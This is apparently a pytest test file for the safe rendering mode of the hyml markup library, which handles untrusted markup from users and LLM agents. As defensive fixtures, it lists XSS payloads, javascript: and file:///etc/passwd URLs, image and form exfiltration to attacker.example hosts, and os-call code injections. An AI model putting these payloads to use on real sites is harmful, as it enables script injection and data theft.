"""Safe data mode: rendering untrusted markup from users and LLM agents."""

import re

import pytest

import hyml
from hyml import HyMLDataError, render_data, validate_data


def problems(source, **options):
    with pytest.raises(HyMLDataError) as e:
        render_data(source, **options)
    return e.value.problems


# rendering

def test_sexpression_and_json_give_the_same_markup():
    sexp = '(ul :class "todo" (li "one") (li (b "two")))'
    data = ["ul", {"class": "todo"}, ["li", "one"], ["li", ["b", "two"]]]
    assert render_data(sexp) == render_data(data) == "<ul class=todo><li>one<li><b>two</b></ul>"


def test_dialects():
    assert render_data('(p (br) "x")', "xhtml") == "<p><br/>x</p>"
    assert render_data('(note (to "Tove"))', "xml") == "<note><to>Tove</to></note>"
    assert render_data('(html (body (p "x")))', "html5-min") == "<p>x"
    with pytest.raises(ValueError):
        render_data("(p)", "svg")


def test_fragments_and_text():
    assert render_data('(p "a") "text" (p "b")') == "<p>a</p>text<p>b</p>"
    assert render_data([["p", "a"], "text", 1, 2.5, None]) == "<p>a</p>text12.5"
    assert render_data('(p Hello 3)') == "<p>Hello3</p>"


def test_attributes():
    assert render_data(["input", {"type": "checkbox", "checked": True, "disabled": False,
                                  "value": None, "data-id": 7}]) == "<input type=checkbox checked data-id=7>"
    assert render_data(["p", {"class": ["a", "b"]}, "x"], "xhtml") == '<p class="a b">x</p>'
    assert render_data('(input :checked :value "a b")') == '<input checked value="a b">'
    assert render_data('(div#main.note.wide :class "x")', "xhtml") == '<div id="main" class="x note wide"/>'


def test_text_and_attribute_values_are_escaped():
    out = render_data(["p", {"title": "\"><script>alert(1)</script>"}, "<script>alert(1)</script> & co"])
    # unquoted attribute values are valid when they have no whitespace, quotes, =, < or >
    assert out == ("<p title=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;>"
                   "&lt;script&gt;alert(1)&lt;/script&gt; &amp; co</p>")


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "'><iframe src=javascript:alert(1)>",
    "</p><a href=\"javascript:alert(1)\">x</a>",
    "<!--<script>",
    "]]><script>",
    "&lt;script&gt;",
]


@pytest.mark.parametrize("payload", XSS_PAYLOADS)
@pytest.mark.parametrize("dialect", ["html5", "xhtml5", "xml"])
def test_payloads_in_text_and_values_never_become_markup(payload, dialect):
    out = render_data(["p", {"title": payload, "data-x": payload}, payload], dialect)
    # the only tags in the output are the <p> element itself
    assert re.findall(r"<[^>]*>", out.replace(out[:out.index(">") + 1], "")) == ["</p>"]


# safe mode

def test_blocked_elements():
    for tag in ["script", "style", "iframe", "object", "embed", "base", "link", "noscript"]:
        assert "not allowed in safe mode" in problems(f'(div ({tag}))')[0], tag
    assert "not allowed in safe mode" in problems('(frameset (frame))', dialect="html4")[0]


def test_blocked_attributes():
    found = problems('(div :onclick "x" :ONMOUSEOVER "y" :style "z" (img :srcdoc "w"))')
    assert len(found) == 4
    assert "onclick" in found[0] and "ONMOUSEOVER" in found[1] and "style" in found[2]
    assert "srcdoc" in found[3]


@pytest.mark.parametrize("url", [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    " javascript:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "javascript&#58;alert(1)",
    "&#106;avascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
])
def test_dangerous_url_schemes(url):
    assert "scheme" in problems(["a", {"href": url}, "x"])[0]


def test_safe_urls():
    for url in ["https://example.com/a?b=1&c=2", "http://x.y", "mailto:a@b.c", "tel:+358",
                "/relative/path", "page.html#top", "#top", "?q=1", "//cdn.example.com/x.js"]:
        assert render_data(["a", {"href": url}, "x"]).startswith("<a href=")


def test_srcset_and_other_url_attributes():
    assert "scheme" in problems(["img", {"srcset": "a.png 1x, javascript:alert(1) 2x"}])[0]
    assert "scheme" in problems(["form", {"action": "javascript:x"}])[0]
    assert "scheme" in problems(["button", {"formaction": "javascript:x"}, "go"])[0]
    assert render_data(["img", {"srcset": "a.png 1x, https://x.y/b.png 2x", "alt": ""}],
                       allow_external_resources=True).startswith("<img")


def test_external_resources_are_rejected_by_default():
    # images load without a click, so their URL can carry stolen data
    for source in ['(img :src "https://attacker.example/log?d=SECRET")',
                   '(img :srcset "//attacker.example/a.png 1x")',
                   '(video :poster "http://attacker.example/p.png")',
                   '(audio (source :src "https://attacker.example/a.mp3"))']:
        assert "loads an external resource" in problems(source)[0], source
    # relative resources and links that need a click are fine
    assert render_data('(img :src "/logo.png" :alt "")') == '<img src=/logo.png alt="">'
    assert render_data('(a :href "https://example.com/?q=1" "x")') == '<a href="https://example.com/?q=1">x</a>'
    assert render_data('(img :src "https://cdn.example/a.png")', allow_external_resources=True)
    assert render_data('(img :src "https://cdn.example/a.png")', safe=False)


def test_forms_posting_elsewhere_are_rejected_by_default():
    assert "sends form data to another host" in problems(
        '(form :action "https://attacker.example/steal" (input :name "password"))')[0]
    assert "sends form data" in problems('(button :formaction "//attacker.example/" "Go")')[0]
    assert render_data('(form :action "/login" (input :name "user"))') == "<form action=/login><input name=user></form>"
    assert render_data('(form :action "https://example.com/x")', allowed_url_hosts=["example.com"])


def test_allowed_url_hosts_stop_exfiltration_through_images():
    hosts = {"allowed_url_hosts": ["example.com"]}
    assert render_data(["img", {"src": "https://example.com/a.png"}], **hosts) == "<img src=https://example.com/a.png>"
    assert render_data(["img", {"src": "/local.png"}], **hosts) == "<img src=/local.png>"
    for url in ["https://evil.example/?secret=1", "//evil.example/x", "HTTP://EVIL.example/"]:
        assert "host that is not allowed" in problems(["img", {"src": url}], **hosts)[0]


def test_allowlists():
    options = {"allowed_tags": ["p", "a", "b"], "allowed_attributes": ["href", "data-*", "aria-*"]}
    assert render_data('(p (a :href "/x" :data-id "1" :aria-label "l" "x"))', **options)
    found = problems('(p :class "x" (i "y"))', **options)
    assert "attribute class is not in the allowed attributes" in found[0]
    assert "<i> is not in the allowed tags" in found[1]


def test_meta_is_allowed_but_not_http_equiv():
    assert render_data('(head (meta :charset "utf-8") (title "t"))') == "<head><meta charset=utf-8><title>t</title>"
    assert "http-equiv" in problems('(meta :http-equiv "refresh" :content "0;url=https://evil.example")')[0]


def test_explicit_allowlists_override_the_blocklist():
    assert render_data('(link :rel "stylesheet" :href "/a.css")', allowed_tags=["link"]) == "<link rel=stylesheet href=/a.css>"
    assert render_data('(p :style "color:red" "x")', allowed_attributes=["style"]) == "<p style=color:red>x</p>"
    # patterns don't re-enable blocked attributes, only exact names do
    assert "not allowed in safe mode" in problems('(p :onclick "x")', allowed_attributes=["on*"])[0]
    # URL checks still apply
    assert "scheme" in problems('(link :href "javascript:x")', allowed_tags=["link"])[0]


def test_safe_false_allows_scripts_but_still_evaluates_nothing():
    assert render_data('(p :style "color:red" (script "x"))', safe=False) == '<p style=color:red><script>x</script></p>'
    assert "code" in problems('(p ~(print "hi"))', safe=False)[0]


# no code evaluation, ever

@pytest.mark.parametrize("source", [
    '(p ~(__import__ "os"))',
    '(p ~@(range 3))',
    "(p `(b ~x))",
    "(p 'x)",
    "(~(+ \"p\" \"\") \"x\")",
])
def test_code_is_rejected(source, capsys):
    assert "code" in problems(source)[0]


def test_json_tags_named_like_code_are_rejected():
    called = []
    found = problems(["unquote", ["print", "evaluated"]], dialect="xml")
    assert "'unquote' is not a valid tag name" in found[0]
    for name in ["unquote-splice", "quasiquote", "quote", "."]:
        assert "not a valid tag name" in problems([name, "x"], dialect="xml")[0]
    assert not called


def test_renderer_refuses_evaluation_in_data_mode():
    from hyml.macros import render
    with pytest.raises(hyml.HyMLError, match="evaluation is disabled"):
        render("html5", list(__import__("hy").read_many("(p ~(+ 1 1))")), evaluation=False)


# names, structure and limits

def test_invalid_names():
    assert "not a valid tag name" in problems(["img onerror=alert(1)"], dialect="xml")[0]
    assert "not a valid tag name" in problems('("!--" "x")', dialect="xml")[0]
    assert "not an html5 element" in problems("(blink)")[0]
    assert "not a valid attribute name" in problems(["p", {"a b": "x"}])[0]
    assert "not a valid attribute name" in problems(["p", {"x\"y": "x"}])[0]


def test_void_elements_and_types():
    assert "void element" in problems(["br", "x"])[0]
    assert "not markup" in problems(["p", {"a": "x"}, {"b": "y"}])[0]
    assert "not markup" in problems(["p", True])[0]
    assert "has a dict value" in problems(["p", {"title": {"x": 1}}])[0]
    assert "outside an element" in problems(":class")[0]
    assert "empty element" in problems("(p ())")[0]


def test_limits():
    deep = "x"
    for _ in range(70):
        deep = ["div", deep]
    assert "max_depth=64" in problems(deep)[0]
    assert render_data(deep, max_depth=100).count("<div>") == 70
    wide = ["ul"] + [["li", str(i)] for i in range(50)]
    assert "max_nodes=20" in problems(wide, max_nodes=20)[0]


def test_problem_paths_and_count():
    found = problems('(html (body (p "ok") (div (script) (a :onclick "x" "y"))))')
    assert found == [
        "html > body[1] > div[2] > script[1]: <script> is not allowed in safe mode, "
        "because it can run scripts or load content",
        "html > body[1] > div[2] > a[2]: attribute onclick is not allowed in safe mode",
    ]
    many = ["div"] + [["script"] for _ in range(50)]
    assert len(problems(many)) == 20


def test_reader_errors_are_problems():
    assert "not valid s-expression text" in problems("(p (unclosed")[0]
    assert "reader macro" in problems('(p #x "y")')[0]
    assert "line 3, column 3: this ( is not closed" in problems('(p\n  (b "x")\n  (i')[0]
    assert "line 1, column 8: a string is not closed" in problems('(p "x" "y)')[0]
    assert problems('(p [1 2])') == ['line 1, column 4: [ is not markup. Use ( ) for elements and " " for text']


def test_validate_data():
    assert validate_data("(p (b \"x\"))") == []
    assert validate_data("(p (script))") == [
        "p > script[1]: <script> is not allowed in safe mode, because it can run scripts or load content"]
    assert validate_data("(p (unclosed")[0].startswith("the markup is not valid")


def test_quoted_hy_models_are_data_too():
    import hy
    assert render_data(hy.read('(p :class "x" "Hello")')) == "<p class=x>Hello</p>"


def test_sexpression_reader():
    from hyml.sexp import read
    assert read('(p :class "x" "Hello" (b bold) 3)') == ([["p", {"class": "x"}, "Hello", ["b", "bold"], "3"]], [])
    assert read('(input :checked :value "a")') == ([["input", {"checked": True, "value": "a"}]], [])
    assert read('; comment\n(p "a\\"b\\n\\u00e4")') == ([["p", 'a"b\nä']], [])
    nodes, found = read('(p ~(os.system "ls") "after")')
    # the form after a code marker is skipped, so it is reported once
    assert nodes == [["p", "after"]] and len(found) == 1 and "line 1, column 4" in found[0]
